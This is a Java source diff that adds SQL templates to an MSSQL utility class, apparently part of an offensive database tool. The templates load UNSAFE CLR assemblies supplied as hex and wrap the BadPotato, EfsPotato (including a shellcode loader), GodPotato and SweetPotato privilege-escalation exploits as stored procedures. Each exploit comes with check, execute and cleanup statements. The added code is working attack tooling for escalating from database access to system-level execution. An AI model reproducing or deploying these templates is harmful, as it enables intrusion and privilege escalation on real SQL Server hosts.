@@ -129,4 +129,36 @@ public class MssqlSqlUtil {
             "EXEC sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'\n" +
             "EXEC sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'";
 
+
+    // ---- potato 系（M3a Keep 项，D12；模板与 Extend 1.3.1 对齐） ----
+    // kind: badpotato / efspotato / efspotato_shellcode / godpotato / sweetpotato
+    public static String checkBadpotatoSql = "if (exists (select * from dbo.sysobjects where name = 'kitbp')) select '1' as res;";
+    public static String CreateBadpotatoSql = "CREATE ASSEMBLY [kitbp]\nAUTHORIZATION [dbo]\nFROM 0x%s\nWITH PERMISSION_SET = UNSAFE;\n";
+    public static String createBadpotatoFSql = "CREATE PROCEDURE [dbo].[kitbp] \n@method NVARCHAR (MAX)   \nAS EXTERNAL NAME [kitbp].[ExecuteRectangle].[Main]";
+    public static String clrbadpotatoSql = "exec kitbp '%s'";
+    public static String closeBadpotatoSql = "if (exists (select * from dbo.sysobjects where name = 'kitbp'))drop proc kitbp;\nif (exists (select * from sys.assemblies where name='kitbp'))drop assembly kitbp;\n";
+
+    public static String checkEfsPotatoSql = "if (exists (select * from dbo.sysobjects where name = 'kitefsp')) select '1' as res;";
+    public static String CreateEfsPotatoSql = "CREATE ASSEMBLY [kitefsp]\nAUTHORIZATION [dbo]\nFROM 0x%s\nWITH PERMISSION_SET = UNSAFE;\n";
+    public static String createEfsPotatoFSql = "CREATE PROCEDURE [dbo].[kitefsp] \n@method NVARCHAR (MAX)   \nAS EXTERNAL NAME [kitefsp].[zcgonvh_EfsPotato].[EfsPotatoExec]";
+    public static String clrEfsPotatoSql = "exec kitefsp '%s'";
+    public static String closeEfsPotatoSql = "if (exists (select * from dbo.sysobjects where name = 'kitefsp'))drop proc kitefsp;\nif (exists (select * from sys.assemblies where name='kitefsp'))drop assembly kitefsp;\n";
+
+    public static String checkEfsPotatoSSql = "if (exists (select * from dbo.sysobjects where name = 'kitefsps')) select '1' as res;";
+    public static String CreateEfsPotatoSSql = "CREATE ASSEMBLY [kitefsps]\nAUTHORIZATION [dbo]\nFROM 0x%s\nWITH PERMISSION_SET = UNSAFE;\n";
+    public static String createEfsPotatoSFSql = "CREATE PROCEDURE [dbo].[kitefsps] \n@method NVARCHAR (MAX),@method1 NVARCHAR (MAX)   \nAS EXTERNAL NAME [kitefsps].[EfsPotato.Program].[load]";
+    public static String clrEfsPotatoSSql = "exec kitefsps '%s','%s'";
+    public static String closeEfsPotatoSSql = "if (exists (select * from dbo.sysobjects where name = 'kitefsps'))drop proc kitefsps;\nif (exists (select * from sys.assemblies where name='kitefsps'))drop assembly kitefsps;\n";
+
+    public static String checkGodPotatoSql = "if (exists (select * from dbo.sysobjects where name = 'kitgodp')) select '1' as res;";
+    public static String CreateGodPotatoSql = "CREATE ASSEMBLY [kitgodp]\nAUTHORIZATION [dbo]\nFROM 0x%s\nWITH PERMISSION_SET = UNSAFE;\n";
+    public static String createGodPotatoFSql = "CREATE PROCEDURE [dbo].[kitgodp] \n@method NVARCHAR (MAX)   \nAS EXTERNAL NAME [kitgodp].[GodPotato.Program].[run]";
+    public static String clrGodPotatoSql = "exec kitgodp '%s'";
+    public static String closeGodPotatoSql = "if (exists (select * from dbo.sysobjects where name = 'kitgodp'))drop proc kitgodp;\nif (exists (select * from sys.assemblies where name='kitgodp'))drop assembly kitgodp;\n";
+
+    public static String checkSweetPotatoSql = "if (exists (select * from dbo.sysobjects where name = 'kitswtp')) select '1' as res;";
+    public static String CreateSweetPotatoSql = "CREATE ASSEMBLY [kitswtp]\nAUTHORIZATION [dbo]\nFROM 0x%s\nWITH PERMISSION_SET = UNSAFE;\n";
+    public static String createSweetPotatoFSql = "CREATE PROCEDURE [dbo].[kitswtp] \n@method NVARCHAR (MAX)   \nAS EXTERNAL NAME [kitswtp].[SweetPotato.Run].[run]";
+    public static String clrSweetPotatoSql = "exec kitswtp '%s'";
+    public static String closeSweetPotatoSql = "if (exists (select * from dbo.sysobjects where name = 'kitswtp'))drop proc kitswtp;\nif (exists (select * from sys.assemblies where name='kitswtp'))drop assembly kitswtp;\n";
 }
